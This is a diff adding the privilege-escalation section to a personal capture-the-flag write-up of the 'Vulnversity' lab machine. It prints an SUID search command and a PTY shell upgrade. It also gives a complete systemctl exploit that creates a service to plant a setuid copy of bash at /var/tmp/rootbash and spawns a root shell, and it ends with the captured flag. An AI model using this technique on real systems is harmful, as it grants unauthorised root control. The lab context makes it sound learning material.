@@ -216,3 +216,78 @@ And there we go, the first flag.
 
 ### Privilege escalation
 
+I tried looking for files in the system with the `SUID` bit (which gives any user the same execution permissions of the owner of the file, and if the owner of the file is `root` then we execute it as `root`)
+
+```
+find / -type f -perm -4000 2>/dev/null
+```
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784662497519.webp)
+
+And one really stood out for me which was `/usr/bin/passwd` which is the binary for changing password of a user, so why don't we try changing the password of `root` itself and logging in as root.
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784662566153.webp)
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784662685812.webp)
+
+And it didn't work, another interesting one is `/bin/systemctl`
+
+before I forget lets spawn a proper terminal with
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784662883622.webp)
+
+Let's see the status of `systemctl` with
+
+```
+/bin/systemctl status
+```
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784662919787.webp)
+
+Great! This works
+
+Something very interesting is that in the `less` you can execute commands like this
+
+```
+! <your command>
+```
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784663388605.webp)
+
+so I tried spawning a `shell` carrying with it the privileges from the user the process was running under but still had no luck
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784663491215.webp)
+
+
+```
+TF=$(mktemp).service # Creates a temporary variable
+
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash"
+[Install]
+WantedBy=multi-user.target' > "$TF"
+
+# creates a service that copies once the `/bin/bash` binary and gives the root permissions
+
+/bin/systemctl link "$TF"
+/bin/systemctl enable --now "$TF"
+
+# makes the server recognize the service
+
+/var/tmp/rootbash -p
+
+# Calls the service
+```
+
+And this spawns the shell with root privileges
+
+![](../../0.%20Assets/Vulnversity%20-%20Machine-1784663570083.webp)
+
+```
+a58ff8579f0a9270368d33a9966c7fd5
+```
